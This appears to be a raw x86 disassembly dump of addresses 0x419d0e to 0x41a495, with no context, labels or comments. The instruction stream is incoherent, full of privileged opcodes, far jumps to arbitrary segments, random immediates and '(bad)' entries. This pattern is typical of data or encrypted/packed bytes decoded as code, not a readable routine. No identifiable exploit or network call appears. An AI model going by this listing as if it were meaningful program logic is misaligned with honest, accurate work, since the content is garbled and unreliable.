  419d0e:	cmp    esi,DWORD PTR [eax]
  419d10:	test   al,0x40
  419d12:	fld    TBYTE PTR [edi+ebp*2-0x64]
  419d16:	push   0xf480a3c7
  419d1b:	push   ds
  419d1c:	or     BYTE PTR [eax+0x551a1238],0xb3
  419d23:	push   ebp
  419d24:	add    eax,0x4f6581cf
  419d29:	jmp    ebx
  419d2b:	jmp    0x27:0x8ea341b
  419d32:	lahf   
  419d33:	dec    esp
  419d34:	fs and al,0x99
  419d37:	ins    BYTE PTR es:[edi],dx
  419d38:	into   
  419d39:	push   ebp
  419d3a:	mov    eax,ds:0x9f73de50
  419d3f:	mov    edi,0x9e8d3bf8
  419d44:	sbb    eax,0xc1a3480e
  419d4a:	xchg   edi,eax
  419d4b:	pop    ebx
  419d4c:	mov    ch,0x12
  419d4e:	ins    BYTE PTR es:[edi],dx
  419d4f:	pop    es
  419d50:	push   edi
  419d51:	not    BYTE PTR [edx+0x4]
  419d54:	fcom   QWORD PTR [ebx]
  419d56:	jae    0x419d08
  419d58:	mov    BYTE PTR [ecx],dh
  419d5a:	push   edi
  419d5b:	or     al,0x1a
  419d5d:	call   0x68265a9e
  419d62:	sub    esp,DWORD PTR [eax-0x17]
  419d65:	jns    0x419dc8
  419d67:	adc    dl,BYTE PTR ss:[eax-0xa1f53ed]
  419d6e:	daa    
  419d6f:	das    
  419d70:	sbb    ebp,DWORD PTR [edi]
  419d72:	cmp    eax,0x3ffb9a84
  419d77:	cmp    DWORD PTR [eax-0x31],esp
  419d7a:	add    al,0x2a
  419d7c:	es leave 
  419d7e:	xchg   edx,eax
  419d7f:	pop    ecx
  419d80:	repnz pop edx
  419d82:	xchg   ecx,eax
  419d83:	pop    edi
  419d84:	adc    BYTE PTR [eax+0x3696a888],bl
  419d8a:	sbb    dh,BYTE PTR [ebp-0x88f7d83]
  419d90:	jg     0x419dd6
  419d92:	or     eax,0xe54ce8a9
  419d97:	or     al,0x13
  419d99:	push   DWORD PTR [eax-0x2afdca32]
  419d9f:	lods   eax,DWORD PTR ds:[esi]
  419da0:	pop    ss
  419da1:	ja     0x419d66
  419da3:	addr16 mov esp,0x273ef03a
  419da9:	je     0x419e02
  419dab:	adc    BYTE PTR [ecx+0x7c23ee07],cl
  419db1:	fisttp DWORD PTR [ebp+0x78]
  419db4:	and    bh,BYTE PTR [esi]
  419db6:	or     BYTE PTR [edi+0x49707edc],0xd5
  419dbd:	daa    
  419dbe:	rol    ch,1
  419dc0:	lods   al,BYTE PTR ds:[esi]
  419dc1:	sub    BYTE PTR [ebx+0x2cf62e1],ch
  419dc7:	jmp    0x419dca
  419dc9:	pushf  
  419dca:	and    bh,BYTE PTR [esi+edi*2+0x3b]
  419dce:	ins    DWORD PTR es:[edi],dx
  419dcf:	popa   
  419dd0:	in     al,dx
  419dd1:	ss mov cl,0x99
  419dd4:	aas    
  419dd5:	popa   
  419dd6:	shl    DWORD PTR [ebx],cl
  419dd8:	xor    BYTE PTR [edi+0x3091e3b6],dh
  419dde:	out    dx,eax
  419ddf:	fldcw  WORD PTR [ebx-0x1791d08a]
  419de5:	sbb    ebp,ecx
  419de7:	lea    edi,[esi]
  419de9:	in     eax,0xa1
  419deb:	dec    ebx
  419dec:	push   ebp
  419ded:	lds    ebp,FWORD PTR [edi]
  419def:	dec    edi
  419df0:	lds    edi,FWORD PTR [eax+eax*8]
  419df3:	aad    0x22
  419df5:	jp     0x419e4b
  419df7:	shl    DWORD PTR [esi-0x58d1ebcd],0xd6
  419dfe:	adc    eax,0x9a584844
  419e03:	mov    ss,WORD PTR [esi-0x50]
  419e06:	jbe    0x419e85
  419e08:	fs fstp st(0)
  419e0b:	stos   DWORD PTR es:[edi],eax
  419e0c:	inc    ecx
  419e0d:	imul   ebp,DWORD PTR [edi+0x673b9812],0xd44b426c
  419e17:	cmp    BYTE PTR [edx],bh
  419e19:	fistp  QWORD PTR [edx+0x79]
  419e1c:	wbinvd 
  419e1e:	jmp    0x419e64
  419e20:	out    dx,eax
  419e21:	lods   al,BYTE PTR ds:[esi]
  419e22:	std    
  419e23:	shl    DWORD PTR [ebx+0x33ec73de],1
  419e29:	and    bl,cl
  419e2b:	push   0x216b586f
  419e30:	test   esi,ebp
  419e32:	test   DWORD PTR [edx-0x53],esi
  419e35:	jno    0x419e14
  419e37:	loopne 0x419df7
  419e39:	cld    
  419e3a:	sbb    eax,0xf8411fff
  419e3f:	outs   dx,DWORD PTR ds:[esi]
  419e40:	sbb    BYTE PTR [edx+0x36],bl
  419e43:	pop    esp
  419e44:	sub    eax,0x46a6e154
  419e49:	inc    ebp
  419e4a:	dec    eax
  419e4b:	adc    DWORD PTR [esi-0x78],eax
  419e4e:	mov    esp,0x8c25ff1d
  419e53:	or     edx,DWORD PTR [edx+0x35]
  419e56:	mov    edx,0x61d0f204
  419e5b:	inc    edx
  419e5c:	jecxz  0x419edd
  419e5e:	mov    ebx,0x362ebad7
  419e63:	inc    ecx
  419e64:	nop
  419e65:	aas    
  419e66:	cmp    ah,BYTE PTR [edx+0x3d]
  419e69:	add    DWORD PTR [ebp+0x28],esp
  419e6c:	adc    ecx,DWORD PTR [esi+edx*4+0x1f356148]
  419e73:	arpl   WORD PTR ds:0xb087b934,dx
  419e79:	gs in  al,dx
  419e7b:	adc    al,0xd3
  419e7d:	mov    ebx,0xa08a9e65
  419e82:	imul   edx,DWORD PTR [edx+0x2a],0x80ebe30f
  419e89:	mov    esp,0xaa371be4
  419e8e:	fwait
  419e8f:	and    dx,WORD PTR [ecx]
  419e92:	into   
  419e93:	xchg   esp,eax
  419e94:	mov    ecx,0x6d507e63
  419e99:	bound  esi,QWORD PTR [ecx-0x6c]
  419e9c:	mov    edx,0x6e8391a
  419ea1:	arpl   bp,di
  419ea3:	scas   al,BYTE PTR es:[edi]
  419ea4:	mov    edx,0x9a05c8af
  419ea9:	sti    
  419eaa:	int    0x65
  419eac:	add    eax,0xa309911d
  419eb1:	jmp    0x419ebd
  419eb3:	xchg   bl,cl
  419eb5:	cmp    BYTE PTR [edi+0x34],dl
  419eb8:	das    
  419eb9:	adc    al,0xaf
  419ebb:	or     edx,esp
  419ebd:	sar    DWORD PTR [edi+0x2a79fcc7],cl
  419ec3:	fs mov al,al
  419ec6:	sbb    al,0x59
  419ec8:	xchg   BYTE PTR [edx-0x1],ch
  419ecb:	in     eax,dx
  419ecc:	js     0x419e55
  419ece:	sbb    edx,DWORD PTR [esi+0x29672f87]
  419ed4:	sbb    ch,BYTE PTR [ebp-0x600a62b3]
  419eda:	push   es
  419edb:	inc    esi
  419edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419edd:	or     eax,0x1db1b62c
  419ee2:	or     DWORD PTR [edi+0x3e3d067c],ecx
  419ee8:	dec    eax
  419ee9:	in     eax,dx
  419eea:	mov    DWORD PTR [ebp+0x2961a800],esp
  419ef0:	inc    ecx
  419ef1:	jge    0x419f10
  419ef3:	shr    BYTE PTR [eax],cl
  419ef5:	mov    cl,BYTE PTR [eax]
  419ef7:	mov    ah,0xe2
  419ef9:	push   0x2e
  419efb:	cli    
  419efc:	sub    esi,DWORD PTR [eax-0x1e]
  419eff:	out    dx,al
  419f00:	lock lahf 
  419f02:	fs sbb al,0x26
  419f05:	daa    
  419f06:	jmp    0x69c:0x6d873710
  419f0d:	fabs   
  419f0f:	xor    al,0x5a
  419f11:	mov    WORD PTR [ebp+0x21],fs
  419f14:	jne    0x419e99
  419f16:	add    eax,DWORD PTR ds:0xc042a3b6
  419f1c:	and    al,0x53
  419f1e:	ds ins BYTE PTR es:[edi],dx
  419f20:	adc    eax,0xbb451498
  419f25:	or     DWORD PTR [eax-0xec0bedb],0xfa2a70aa
  419f2f:	call   0xa6c3:0xcf7709e
  419f36:	fwait
  419f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f38:	mov    dh,0x5e
  419f3a:	retf   
  419f3b:	js     0x419fa0
  419f3d:	js     0x419f2b
  419f3f:	xlat   BYTE PTR ds:[ebx]
  419f40:	test   DWORD PTR [esi+0xd42dc3e],edi
  419f46:	mov    ecx,esp
  419f48:	xor    dh,BYTE PTR [ecx-0xf5959b2]
  419f4e:	(bad)  
  419f4f:	es jmp 0x419f7e
  419f52:	sub    esi,0xdb31776c
  419f58:	arpl   WORD PTR [esi-0x5b],si
  419f5b:	mov    ds:0x58e2142b,eax
  419f60:	or     eax,0x926db564
  419f65:	adc    DWORD PTR [eax+edi*4],ecx
  419f68:	mov    ?,ebx
  419f6a:	js     0x419f6b
  419f6c:	adc    eax,0x51bafaaa
  419f71:	div    cl
  419f73:	stos   DWORD PTR es:[edi],eax
  419f74:	cmc    
  419f75:	adc    ch,dh
  419f77:	scas   al,BYTE PTR es:[edi]
  419f78:	inc    eax
  419f79:	xor    DWORD PTR [ecx-0x66],edi
  419f7c:	imul   eax,DWORD PTR [edx],0xffffffbd
  419f7f:	mov    DWORD PTR [edx],edi
  419f81:	mov    BYTE PTR [eax-0x19],0x29
  419f85:	mov    dl,0x90
  419f87:	pop    eax
  419f88:	inc    cl
  419f8a:	fnstenv [eax]
  419f8c:	inc    edi
  419f8d:	fsub   st,st(0)
  419f8f:	inc    ebx
  419f90:	mov    edi,0xe8f4bb95
  419f95:	pop    edi
  419f96:	mov    DWORD PTR [ecx],esp
  419f98:	jnp    0x419fb5
  419f9a:	test   ecx,eax
  419f9c:	xor    bh,BYTE PTR [ebx+0x75]
  419f9f:	cld    
  419fa0:	mov    ah,0xbd
  419fa2:	adc    esp,ebp
  419fa4:	addr16 mov al,0xe6
  419fa7:	jge    0x419f2e
  419fa9:	mov    es,edi
  419fab:	mov    bl,0x15
  419fad:	fisttp QWORD PTR [ecx]
  419faf:	rol    ecx,cl
  419fb1:	div    BYTE PTR [esi]
  419fb3:	in     al,0x2f
  419fb5:	push   esi
  419fb6:	shl    DWORD PTR [edi+0x76],cl
  419fb9:	mov    ebx,0xe8401779
  419fbe:	faddp  st(7),st
  419fc0:	xchg   ebx,eax
  419fc1:	aaa    
  419fc2:	dec    esp
  419fc3:	in     al,0xbd
  419fc5:	push   ebx
  419fc6:	std    
  419fc7:	add    al,0x8c
  419fc9:	dec    ebp
  419fca:	xchg   ecx,eax
  419fcb:	xchg   ebx,eax
  419fcc:	mov    ecx,esi
  419fce:	stos   DWORD PTR es:[edi],eax
  419fcf:	xor    BYTE PTR [eax+0x3fdfd0be],bl
  419fd5:	push   0xb78ac973
  419fda:	adc    DWORD PTR [ecx],0x1756636a
  419fe0:	in     al,0x0
  419fe2:	in     eax,dx
  419fe3:	add    DWORD PTR [esi],ebp
  419fe5:	stos   BYTE PTR es:[edi],al
  419fe6:	imul   ecx,DWORD PTR [edx+0x77],0x3e6e0fc9
  419fed:	shl    BYTE PTR [ebx+0x15],cl
  419ff0:	mov    gs,esi
  419ff2:	mov    edi,0xf05fb720
  419ff7:	jecxz  0x41a075
  419ff9:	xchg   ecx,eax
  419ffa:	sbb    ebp,edx
  419ffc:	in     eax,dx
  419ffd:	jbe    0x419fa6
  419fff:	sbb    al,0xba
  41a001:	int3   
  41a002:	scas   al,BYTE PTR es:[edi]
  41a003:	push   ebx
  41a004:	in     eax,0x5a
  41a006:	shl    BYTE PTR [edi-0xb2a4bd6],cl
  41a00c:	dec    esp
  41a00d:	adc    eax,0xccac0534
  41a012:	lahf   
  41a013:	cmp    al,0xb4
  41a015:	rcl    BYTE PTR [ebx],cl
  41a017:	or     esp,ecx
  41a019:	push   ds
  41a01a:	(bad)  
  41a01c:	push   edi
  41a01d:	in     al,dx
  41a01e:	enter  0x8df6,0x5f
  41a022:	fidiv  WORD PTR [ebx-0x20]
  41a025:	or     BYTE PTR [ecx],dl
  41a027:	sub    DWORD PTR [edi+0x752528e9],edx
  41a02d:	dec    ebp
  41a02e:	enter  0xa051,0x57
  41a032:	outs   dx,DWORD PTR ds:[esi]
  41a033:	icebp  
  41a034:	or     BYTE PTR [edi+0x3f],0x8b
  41a038:	aaa    
  41a039:	cmp    eax,0x4d744033
  41a03e:	ja     0x41a093
  41a040:	sub    al,0x25
  41a042:	fadd   st(2),st
  41a044:	cmp    bl,BYTE PTR [ecx+0x52]
  41a047:	(bad)  
  41a049:	sub    al,BYTE PTR [ebp-0x15]
  41a04c:	out    0xb3,eax
  41a04e:	sub    eax,0x51fd07db
  41a053:	sub    bh,BYTE PTR [edx-0x691b57e0]
  41a059:	or     dh,BYTE PTR [ecx+edi*8-0x5d]
  41a05d:	inc    ebp
  41a05e:	je     0x41a0d7
  41a060:	sub    eax,0xaed5b66c
  41a065:	pop    es
  41a066:	ss (bad) 
  41a068:	div    cl
  41a06a:	push   0x38
  41a06c:	jmp    0x38d9:0x23bd5887
  41a073:	rcr    DWORD PTR [ecx+0x31],1
  41a076:	jbe    0x41a0cf
  41a078:	mov    ebp,0xd45125e2
  41a07d:	inc    ebp
  41a07e:	ffreep st(0)
  41a080:	cli    
  41a081:	push   cs
  41a082:	adc    al,0x99
  41a084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a085:	sub    esi,esi
  41a087:	retf   0xe50a
  41a08a:	jmp    0xe570:0x868d564e
  41a091:	lods   eax,DWORD PTR ds:[esi]
  41a092:	dec    esi
  41a093:	or     DWORD PTR [edx-0x29b2f6e7],edi
  41a099:	lods   eax,DWORD PTR ds:[esi]
  41a09a:	jg     0x41a0e0
  41a09c:	cmp    DWORD PTR [eax],ebp
  41a09e:	rcl    edi,0x8e
  41a0a1:	sub    al,0xb5
  41a0a3:	test   al,0x58
  41a0a5:	jle    0x41a062
  41a0a7:	adc    al,0xa3
  41a0a9:	mov    eax,0x7e1a48ee
  41a0ae:	test   DWORD PTR [edx+0x37f22c09],edx
  41a0b4:	popa   
  41a0b5:	scas   eax,DWORD PTR es:[edi]
  41a0b6:	mov    ds:0x7b74c589,eax
  41a0bb:	fsubr  QWORD PTR ds:0x5187f791
  41a0c1:	xor    al,0xf4
  41a0c3:	imul   esp,DWORD PTR [ecx],0xffffff8f
  41a0c6:	sbb    eax,0xf247a17
  41a0cb:	lock jg 0x41a121
  41a0ce:	cmp    al,0xa0
  41a0d0:	test   al,0xd5
  41a0d2:	add    eax,0x581fbf2c
  41a0d7:	in     al,0xa
  41a0d9:	fs stos BYTE PTR es:[edi],al
  41a0db:	js     0x41a124
  41a0dd:	int    0x27
  41a0df:	mov    edx,0x4fea97b0
  41a0e4:	adc    esp,0xdd6c8f28
  41a0ea:	dec    ecx
  41a0eb:	mov    es,WORD PTR [esi]
  41a0ed:	idiv   DWORD PTR [ebx+esi*1]
  41a0f0:	(bad)
  41a0f3:	aaa    
  41a0f4:	inc    esi
  41a0f5:	or     BYTE PTR [eax],bl
  41a0f7:	lahf   
  41a0f8:	jbe    0x41a0ff
  41a0fa:	test   eax,0x78a7272f
  41a0ff:	mov    cl,bl
  41a101:	adc    eax,DWORD PTR [edi+0x470e152b]
  41a107:	mov    edx,0x23780b93
  41a10c:	push   ebp
  41a10d:	test   DWORD PTR [ebx-0x3c6d047f],0x3f876fb5
  41a117:	inc    esp
  41a118:	bound  edx,QWORD PTR [edx+0x14e4ff9]
  41a11e:	pop    edx
  41a11f:	loope  0x41a12e
  41a121:	push   cs
  41a122:	xor    bh,dh
  41a124:	ret    
  41a125:	rcl    BYTE PTR [edi],1
  41a127:	rcl    dh,cl
  41a129:	rol    DWORD PTR ds:0x8dcfddbd,0x74
  41a130:	push   edi
  41a131:	dec    ebp
  41a132:	rcl    edi,1
  41a134:	add    al,0xb0
  41a136:	mov    ebx,0xa959df92
  41a13b:	mov    al,0x6d
  41a13d:	jnp    0x41a150
  41a13f:	inc    ecx
  41a140:	xchg   ebp,eax
  41a141:	out    dx,al
  41a142:	sub    al,0x8e
  41a144:	jb     0x41a16c
  41a146:	out    dx,al
  41a147:	xchg   ecx,eax
  41a148:	(bad)  
  41a149:	imul   ebx,eax,0xffffffac
  41a14c:	push   esp
  41a14d:	lds    ecx,FWORD PTR [ecx]
  41a14f:	mov    BYTE PTR [edi+edi*2+0x68],bh
  41a153:	add    edx,edx
  41a155:	mov    dl,0x6e
  41a157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a158:	je     0x41a0f2
  41a15a:	ret    
  41a15b:	jmp    0xcf28:0xc86950b9
  41a162:	jl     0x41a15d
  41a164:	pop    eax
  41a165:	mov    ah,0x67
  41a167:	in     eax,dx
  41a168:	popa   
  41a169:	push   0x46
  41a16b:	push   ebp
  41a16c:	push   es
  41a16d:	adc    eax,0x88ca5d39
  41a172:	aad    0xf7
  41a174:	pop    ds
  41a175:	dec    ebx
  41a176:	rcr    cl,0x50
  41a179:	scas   eax,DWORD PTR es:[edi]
  41a17a:	jns    0x41a1e1
  41a17c:	outs   dx,DWORD PTR ds:[esi]
  41a17d:	xchg   edi,eax
  41a17e:	or     al,0xa5
  41a180:	repnz loopne 0x41a15f
  41a183:	or     ah,BYTE PTR [esi]
  41a185:	shr    DWORD PTR [ebx],0x20
  41a188:	dec    esi
  41a189:	cmp    al,0xe6
  41a18b:	inc    ebx
  41a18c:	js     0x41a1df
  41a18e:	das    
  41a18f:	or     al,0x4f
  41a191:	dec    ecx
  41a192:	sbb    bh,BYTE PTR ds:0xa9f8370
  41a198:	icebp  
  41a199:	inc    edx
  41a19a:	lds    edi,FWORD PTR [ebx+eiz*1+0x2c]
  41a19e:	mov    DWORD PTR [eax],ecx
  41a1a0:	cwde   
  41a1a1:	test   DWORD PTR [ebx+0x594aa1a2],ebp
  41a1a7:	pop    ss
  41a1a8:	pop    ds
  41a1a9:	mov    ds:0x78a52bf0,al
  41a1ae:	in     eax,dx
  41a1af:	stos   BYTE PTR es:[edi],al
  41a1b0:	fild   WORD PTR [eax+esi*4+0x554a392f]
  41a1b7:	loop   0x41a22a
  41a1b9:	push   cs
  41a1ba:	dec    ecx
  41a1bb:	sub    al,bh
  41a1bd:	pop    esp
  41a1be:	add    eax,0xc77f7e75
  41a1c3:	cmp    dh,BYTE PTR [ebp+0x6c3fea1b]
  41a1c9:	popf   
  41a1ca:	das    
  41a1cb:	mov    edi,ebp
  41a1cd:	scas   al,BYTE PTR es:[edi]
  41a1ce:	mov    edi,0x30d53914
  41a1d3:	sub    DWORD PTR [edx-0x1e266a20],edx
  41a1d9:	xor    edx,DWORD PTR ss:[edx+0x4c]
  41a1dd:	jb     0x41a18c
  41a1df:	jnp    0x41a1a0
  41a1e1:	sbb    edx,DWORD PTR [ebp-0x24]
  41a1e4:	cmp    BYTE PTR [ebx+0x3797e74c],bh
  41a1ea:	cmp    BYTE PTR [ecx+0x6d0b90cc],bl
  41a1f0:	int    0xc2
  41a1f2:	test   DWORD PTR [eax-0x4a17cbe5],eax
  41a1f8:	mov    ah,BYTE PTR [edx+0x48]
  41a1fb:	cmp    edi,ecx
  41a1fd:	stos   BYTE PTR es:[edi],al
  41a1fe:	loop   0x41a25f
  41a200:	(bad)  
  41a201:	or     eax,0x138914b1
  41a206:	or     eax,0xe1183948
  41a20b:	mov    bh,0x76
  41a20d:	add    esp,DWORD PTR [ecx+0x66]
  41a210:	dec    edx
  41a211:	stos   BYTE PTR es:[edi],al
  41a212:	jns    0x41a28f
  41a214:	push   ebx
  41a215:	out    dx,al
  41a216:	pop    es
  41a217:	icebp  
  41a218:	dec    esp
  41a219:	ins    BYTE PTR es:[edi],dx
  41a21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a21b:	test   DWORD PTR [ebp+ebx*8+0x25],eax
  41a21f:	mov    esp,ecx
  41a221:	ret    
  41a222:	dec    eax
  41a223:	push   ebx
  41a224:	aam    0x43
  41a226:	dec    ebp
  41a227:	not    BYTE PTR cs:[esp+ebx*1+0x5b]
  41a22c:	mov    bl,0x2c
  41a22e:	inc    esi
  41a22f:	je     0x41a1f4
  41a231:	pop    edi
  41a232:	add    BYTE PTR [ebx+ebp*2+0x4f],bl
  41a236:	int    0xda
  41a238:	rol    BYTE PTR [esi+ebp*4+0x21],1
  41a23c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a23d:	cmp    eax,0x5907c4fc
  41a242:	ja     0x41a225
  41a244:	lds    ebp,FWORD PTR [edx-0xe]
  41a247:	adc    BYTE PTR [edx],0xba
  41a24a:	lods   al,BYTE PTR ds:[esi]
  41a24b:	imul   ebp,DWORD PTR [edx],0x47
  41a24e:	lock stos BYTE PTR es:[edi],al
  41a250:	rcr    DWORD PTR [eax-0x472bb91a],0xae
  41a257:	mov    ecx,DWORD PTR [ebx]
  41a259:	sbb    eax,0x1efb45ac
  41a25e:	mov    edi,0xc29f0f6e
  41a263:	adc    dl,bh
  41a265:	sar    BYTE PTR [ebx],1
  41a267:	xor    DWORD PTR [ecx+0x24e65761],eax
  41a26d:	mov    eax,0x1e5dcc0
  41a272:	cwde   
  41a273:	fcmovb st,st(0)
  41a275:	xlat   BYTE PTR ds:[ebx]
  41a276:	test   al,0x72
  41a278:	cmp    BYTE PTR [edi-0xf],0xe0
  41a27c:	adc    BYTE PTR [ebx-0x39],bl
  41a27f:	add    ecx,DWORD PTR [eax-0x47]
  41a282:	neg    dh
  41a284:	inc    esp
  41a285:	in     eax,0x46
  41a287:	je     0x41a2cf
  41a289:	and    BYTE PTR ds:0x1d9aef00,bh
  41a28f:	sbb    DWORD PTR [eax+0x73aefe06],ecx
  41a295:	add    al,0xd5
  41a297:	mov    ebp,0x2cb1470c
  41a29c:	aam    0xa0
  41a29e:	imul   edx,DWORD PTR [bp+si],0x208ccd52
  41a2a5:	in     eax,0xef
  41a2a7:	xor    BYTE PTR [ecx-0x76],bh
  41a2aa:	arpl   WORD PTR [eax],bp
  41a2ac:	repz add dh,BYTE PTR gs:[ebp+ebx*8-0x1b]
  41a2b2:	jno    0x41a313
  41a2b4:	sahf   
  41a2b5:	pop    ecx
  41a2b6:	inc    edx
  41a2b7:	int    0xcf
  41a2b9:	imul   ecx,ebp,0x54259f48
  41a2bf:	repz push ds
  41a2c1:	sbb    DWORD PTR [edi+0x6e],ecx
  41a2c4:	pop    esi
  41a2c5:	mov    cl,0x1f
  41a2c7:	scas   al,BYTE PTR es:[edi]
  41a2c8:	fild   WORD PTR [esi-0x10aaf88]
  41a2ce:	dec    edi
  41a2cf:	idiv   DWORD PTR [ebx+0x55]
  41a2d2:	mov    dl,BYTE PTR [edx+0x34]
  41a2d5:	or     eax,DWORD PTR [edi-0x35]
  41a2d8:	shl    DWORD PTR [ebp+0x57],0x38
  41a2dc:	repz out 0xfc,eax
  41a2df:	push   ss
  41a2e0:	repz add ah,BYTE PTR [eax+eax*2+0x32ddef24]
  41a2e8:	xlat   BYTE PTR ds:[ebx]
  41a2e9:	jp     0x41a31d
  41a2eb:	pop    es
  41a2ec:	lahf   
  41a2ed:	mov    esi,0xe68be66a
  41a2f2:	pop    ebx
  41a2f3:	cmc    
  41a2f4:	sbb    bl,dl
  41a2f6:	inc    edi
  41a2f7:	inc    esp
  41a2f8:	ret    
  41a2f9:	neg    BYTE PTR [ecx+0x4]
  41a2fc:	xchg   ebx,eax
  41a2fd:	shl    BYTE PTR [eax-0x4e0c7b8d],1
  41a303:	ret    0xdb22
  41a306:	(bad)  
  41a307:	cmp    esp,DWORD PTR [edx]
  41a309:	cmp    DWORD PTR [ebp+0x22c25898],0xb3ccaf0c
  41a313:	inc    edi
  41a314:	xor    al,0xad
  41a316:	push   ecx
  41a317:	not    eax
  41a319:	mov    ds:0x49cd6ceb,al
  41a31e:	neg    ebp
  41a320:	mov    DWORD PTR [ebp-0x426bade0],ebx
  41a326:	cmp    DWORD PTR ds:0x5a302cb7,edx
  41a32c:	inc    edi
  41a32d:	pop    edi
  41a32e:	dec    ebx
  41a32f:	scas   eax,DWORD PTR es:[edi]
  41a330:	pop    esp
  41a331:	popa   
  41a332:	inc    esi
  41a333:	aam    0xae
  41a335:	out    0x6,al
  41a337:	sbb    BYTE PTR [ecx],bh
  41a339:	outs   dx,DWORD PTR ds:[esi]
  41a33a:	sub    ebp,DWORD PTR [ebx-0x20]
  41a33d:	xchg   ebp,eax
  41a33e:	stos   BYTE PTR es:[edi],al
  41a33f:	cmc    
  41a340:	pop    edx
  41a341:	dec    edi
  41a342:	xchg   esi,eax
  41a343:	pop    ds
  41a344:	into   
  41a345:	sti    
  41a346:	rcl    BYTE PTR [edx+0xf],1
  41a349:	sahf   
  41a34a:	pop    edi
  41a34b:	jno    0x41a30d
  41a34d:	xor    eax,0x410e3a5
  41a352:	mov    ch,0x13
  41a354:	push   cs
  41a355:	int3   
  41a356:	mov    ds:0x2eb08904,eax
  41a35b:	imul   ebx,esi,0xffffffe1
  41a35e:	stc    
  41a35f:	jmp    0x41a3b8
  41a361:	dec    edx
  41a362:	jecxz  0x41a3a0
  41a364:	fwait
  41a365:	out    0x8f,eax
  41a367:	cmc    
  41a368:	pop    es
  41a369:	test   DWORD PTR cs:[esi],ebp
  41a36c:	sub    eax,0x5df0b6e8
  41a371:	sti    
  41a372:	jb     0x41a3eb
  41a374:	and    ecx,eax
  41a376:	stc    
  41a377:	mov    DWORD PTR [eax+0x390701fc],ecx
  41a37d:	rol    DWORD PTR [eax],cl
  41a37f:	ss test eax,0x9939506d
  41a385:	mov    bh,0xcb
  41a387:	test   DWORD PTR [eax-0x2228a753],ecx
  41a38d:	push   ebx
  41a38e:	mov    ah,0xb2
  41a390:	out    0xba,eax
  41a392:	adc    bh,bl
  41a394:	ror    esp,0x76
  41a397:	or     BYTE PTR [eax+eax*1-0x4b43159a],ah
  41a39e:	mov    edx,0x954cf2cf
  41a3a3:	addr16 int3 
  41a3a5:	scas   al,BYTE PTR es:[edi]
  41a3a6:	push   ecx
  41a3a7:	stc    
  41a3a8:	js     0x41a39f
  41a3aa:	fidivr DWORD PTR [ebx+ebx*1]
  41a3ad:	push   0xffffff89
  41a3af:	std    
  41a3b0:	cmp    al,0x4c
  41a3b2:	pop    esi
  41a3b3:	clc    
  41a3b4:	sbb    BYTE PTR [edx],al
  41a3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3b8:	pusha  
  41a3b9:	in     al,dx
  41a3ba:	fwait
  41a3bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3bc:	sar    DWORD PTR [edx+0x2b07c1a4],1
  41a3c2:	and    BYTE PTR [ebx-0x10b32559],dl
  41a3c8:	pusha  
  41a3c9:	gs sar al,cl
  41a3cc:	cmc    
  41a3cd:	loopne 0x41a37b
  41a3cf:	stos   BYTE PTR es:[edi],al
  41a3d0:	icebp  
  41a3d1:	xor    al,0x82
  41a3d3:	jne    0x41a446
  41a3d5:	rol    BYTE PTR [ecx+0x4d],0xda
  41a3d9:	xor    eax,0x213f73e4
  41a3de:	sbb    BYTE PTR [esi-0x55fc104b],0x41
  41a3e5:	stos   BYTE PTR es:[edi],al
  41a3e6:	xor    al,bl
  41a3e8:	jge    0x41a464
  41a3ea:	retf   0xeb93
  41a3ed:	nop
  41a3ee:	(bad)  
  41a3ef:	jmp    0x86ea1e70
  41a3f4:	iret   
  41a3f5:	mov    eax,0x934b1338
  41a3fa:	jne    0x41a394
  41a3fc:	push   ebp
  41a3fd:	add    DWORD PTR [ecx+edx*2],eax
  41a400:	test   DWORD PTR [ecx-0x3d],esi
  41a403:	mov    dh,0x98
  41a405:	das    
  41a406:	dec    ebx
  41a407:	test   eax,0x3ab1790a
  41a40c:	lods   eax,DWORD PTR ds:[esi]
  41a40d:	mov    bl,0x21
  41a40f:	pop    es
  41a410:	fsub   QWORD PTR [ebx+0x45]
  41a413:	pop    edi
  41a414:	(bad)  
  41a415:	cli    
  41a416:	push   ebx
  41a417:	xchg   ecx,eax
  41a418:	inc    esi
  41a419:	sbb    BYTE PTR [edx+0x13],bl
  41a41c:	(bad)  
  41a41d:	ds xchg esp,eax
  41a41f:	xor    cl,BYTE PTR [esi+0x8fe4f0c]
  41a425:	lods   al,BYTE PTR ds:[esi]
  41a426:	jns    0x41a433
  41a428:	retf   0x9e21
  41a42b:	jnp    0x41a3bf
  41a42d:	daa    
  41a42e:	sub    DWORD PTR [ebx+0x7],ebp
  41a431:	popa   
  41a432:	lods   eax,DWORD PTR ds:[esi]
  41a433:	sahf   
  41a434:	cld    
  41a435:	fld    DWORD PTR [ebp-0x46]
  41a438:	mov    dl,0x14
  41a43a:	popf   
  41a43b:	int3   
  41a43c:	sub    al,0x4d
  41a43e:	push   edi
  41a43f:	mov    edx,0x42f82965
  41a444:	dec    esi
  41a445:	push   ebx
  41a446:	or     bl,BYTE PTR [edi-0x7e]
  41a449:	fcom   DWORD PTR [ecx+0xaec622c]
  41a44f:	and    eax,0x5365962a
  41a454:	shl    BYTE PTR [esi-0x6be0780f],cl
  41a45a:	test   eax,0x5ac1c6f8
  41a45f:	jl     0x41a4a2
  41a461:	loopne 0x41a3f3
  41a463:	mov    ebp,0x678c4af0
  41a468:	pushf  
  41a469:	ss inc eax
  41a46b:	call   DWORD PTR [ebp+0x4f535e52]
  41a471:	pusha  
  41a472:	in     eax,dx
  41a473:	jmp    FWORD PTR [ecx-0x2b2faa64]
  41a479:	loopne 0x41a43c
  41a47b:	cmp    al,0xd1
  41a47d:	mov    WORD PTR [eax+0x4e],ds
  41a480:	push   es
  41a481:	jno    0x41a43c
  41a483:	pop    esi
  41a484:	jecxz  0x41a4d8
  41a486:	add    BYTE PTR [ecx+0x16],ah
  41a489:	jecxz  0x41a430
  41a48b:	mov    ah,0xff
  41a48d:	cdq    
  41a48e:	sbb    dl,BYTE PTR [edi-0x2b]
  41a491:	shr    DWORD PTR [ebx-0x9],cl
  41a494:	retf   
  41a495:	adc    eax,0x556b0390
